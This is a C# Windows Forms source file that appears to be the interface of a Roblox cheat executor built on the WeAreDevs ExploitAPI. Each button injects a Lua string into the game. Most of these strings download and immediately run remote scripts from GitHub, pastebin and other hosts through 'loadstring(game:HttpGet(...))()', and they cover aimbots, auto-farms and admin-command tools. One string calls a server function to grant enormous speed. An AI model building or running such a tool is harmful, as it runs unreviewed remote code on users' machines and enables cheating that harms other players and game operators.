using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using Bunifu.Framework.UI;
using WeAreDevs_API;

namespace EclipseWare
{
    public partial class EclipseHub : Form
    {
        ExploitAPI api = new ExploitAPI();
        public EclipseHub()
        {
            InitializeComponent();
        }

        private void EclipseHub_Load(object sender, EventArgs e)
        {
            Hide();
        }

        private void bunifuFlatButton2_Click(object sender, EventArgs e)
        {
            // Aimbot
            string aimbot = "loadstring(game: HttpGet('https://raw.githubusercontent.com/Exunys/Aimbot-V2/main/Resources/Scripts/Raw%20Main.lua'))()";

            api.SendLuaScript(aimbot);
        }

        private void bunifuFlatButton1_Click(object sender, EventArgs e)
        {
            // PhantomForce
            string phantomforce = "loadstring(game: HttpGet('https://raw.githubusercontent.com/VoidMasterX/strawhook/main/script.lua', true))()";

            api.SendLuaScript(phantomforce);
        }

        private void bunifuFlatButton3_Click(object sender, EventArgs e)
        {
            // Strength Training Simulator
            string strength = "loadstring(game:HttpGet(('https://www.klgrth.io/paste/tdrv3/raw')))()";

            api.SendLuaScript(strength);
        }

        private void bunifuFlatButton4_Click(object sender, EventArgs e)
        {
            // Murder Mystery 2
            string mm2 = "loadstring(game:HttpGet('https://soggyhub.bad.mn',true))()";

            api.SendLuaScript(mm2);
        }

        private void bunifuFlatButton5_Click(object sender, EventArgs e)
        {
            // SharkBite Script
            string ss = "loadstring(game:HttpGet('https://raw.githubusercontent.com/LOOF-sys/Roblox-Shit/main/SharkBite.lua'))()";

            api.SendLuaScript(ss);
        }

        private void bunifuFlatButton6_Click(object sender, EventArgs e)
        {
            // Combat Warrior Script
            string cws = "loadstring(game:HttpGet(\'https://raw.githubusercontent.com/SpiritXmas/Project-Hook/main/required.lua\'))()";

            api.SendLuaScript(cws);
        }

        private void bunifuImageButton7_Click(object sender, EventArgs e)
        {
            //minimize
            WindowState = FormWindowState.Minimized;
        }

        private void bunifuImageButton8_Click(object sender, EventArgs e)
        {
            //close
            Hide();
        }

        private void bunifuFlatButton7_Click(object sender, EventArgs e)
        {
            //speedsimulator inf speed
            string ssi = "game:GetService(\'ReplicatedStorage\').GlobalFunctions.AddPlayerSpeed:FireServer(385000000000,385000000000)";

            api.SendLuaScript(ssi);
        }

        private void bunifuFlatButton8_Click(object sender, EventArgs e)
        {
            //Piece X Tycoon FAST AUTO FRUIT MASTERY FARM
            string pxt = "loadstring(game:HttpGet('https://pastebin.com/raw/U6UxC50H'))()";

            api.SendLuaScript(pxt);
        }

        private void bunifuFlatButton9_Click(object sender, EventArgs e)
        {
            // adoptme script

            string ams = "loadstring(game:HttpGet(\'https://raw.githubusercontent.com/BloxiYT/Diamond/main/AdoptMe\'))()";

            api.SendLuaScript(ams);
        }

        private void bunifuFlatButton10_Click(object sender, EventArgs e)
        {
            // Infinite Yeild
            string inf = "loadstring(game:HttpGet(\'https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source\'))()";

            api.SendLuaScript(inf);
        }
    }
}
